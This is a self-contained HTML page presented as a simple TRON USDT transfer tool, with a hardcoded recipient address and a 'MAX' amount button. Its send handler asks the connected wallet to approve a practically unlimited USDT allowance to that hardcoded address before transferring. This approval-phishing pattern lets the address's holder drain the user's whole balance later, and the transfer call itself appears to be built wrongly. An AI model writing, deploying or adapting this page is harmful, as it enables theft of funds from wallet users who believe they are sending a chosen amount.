<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  max-width: 520px;
  margin: 0 auto;
}
/* 顶部右上角图标栏 */
.top-header-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.header-right-icons {
  display: flex;
  gap: 16px;
  align-items: center;
}
.icon-btn {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  border: 1px solid #ddd;
  background: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  cursor: pointer;
}
.address-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  color: #333;
  word-break: break-all;
}
.amount-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom:16px;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 48px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
.amount-input::placeholder {
  font-size: 18px;
  color: #aaa;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
  font-weight: 500;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-card{
  background:#fff;
  border-radius:16px;
  padding:18px;
  margin-bottom:16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  font-weight:500;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}
.bottom-tip {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: white;
  padding: 12px 20px;
  border-radius: 12px;
  box-shadow: 0 2px 12px rgba(0,0,0,0.1);
  text-align: center;
}
</style>
</head>
<body>

<div class="top-header-bar">
  <div></div>
  <div class="header-right-icons">
    <!-- 锁形小人按钮：连接钱包 -->
    <div class="icon-btn" id="walletIconBtn" title="连接钱包">🔐</div>
    <!-- 齿轮设置按钮 -->
    <div class="icon-btn" id="settingIconBtn" title="设置">⚙️</div>
  </div>
</div>

<div class="address-card">
  <div class="label-text">收款地址</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="amount-card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>

  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="result-card">
  <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<div class="bottom-tip" id="tipBox">
  <span id="tipText">点击右上角锁形图标连接钱包</span>
</div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let userAddress = "";
let usdtContract = null;

const $ = s => document.querySelector(s);
const walletIconBtn = $("#walletIconBtn");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const tipText = $("#tipText");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");

// 新版标准ABI（修复constant兼容性报错）
const USDT_ABI = [
  {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

// 手动点击锁图标连接钱包
async function connectWalletByIcon() {
  tipText.textContent = "正在请求波场钱包授权...";
  try {
    let provider = window.tronProvider;

    if (!provider && window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      userAddress = tronWeb.defaultAddress.base58;
    } else if (provider) {
      const accounts = await provider.request({ method: "tron_requestAccounts" });
      if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
      userAddress = accounts[0];
      tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
    } else {
      throw new Error("未检测到波场钱包，请在TP内置浏览器打开本地HTML文件");
    }

    tipText.textContent = `已连接：${userAddress.slice(0,10)}...${userAddress.slice(-6)}`;
    walletIconBtn.innerText = "✅";

    usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    await loadBalance();
    sendBtn.disabled = false;

    if(provider) provider.on("accountsChanged", () => location.reload());
  } catch (err) {
    tipText.textContent = "连接失败：" + err.message;
    console.error(err);
  }
}

async function loadBalance() {
  const raw = await usdtContract.balanceOf(userAddress).call();
  balanceText.textContent = tronWeb.fromSun(raw).toFixed(6);
}

amountInput.addEventListener("input", () => {
  const num = parseFloat(amountInput.value) || 0;
  receiveAmount.value = num.toFixed(6);
});

maxBtn.addEventListener("click", async () => {
  if (!usdtContract) return alert("请先点击右上角锁图标连接钱包");
  const raw = await usdtContract.balanceOf(userAddress).call();
  const num = tronWeb.fromSun(raw);
  amountInput.value = num.toFixed(2);
  amountInput.dispatchEvent(new Event("input"));
});

sendBtn.addEventListener("click", async () => {
  if (!tronWeb) return alert("请先连接钱包");
  const val = parseFloat(amountInput.value);
  if (isNaN(val) || val <= 0) return alert("输入有效数量");
  const sunVal = tronWeb.toSun(val);

  try {
    const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
    if (Number(allowance) < sunVal) {
      alert("需要授权USDT合约，请签名");
      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
      alert("授权成功，开始转账");
    }
    const tx = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
    alert(`转账成功！哈希：${tx}`);
    await loadBalance();
  } catch (e) {
    alert("操作失败：" + e.message);
  }
});

// 绑定点击事件
walletIconBtn.addEventListener("click", connectWalletByIcon);
settingIconBtn.addEventListener("click", () => {
  alert("设置功能可后续扩展");
});
</script>

</body>
</html>
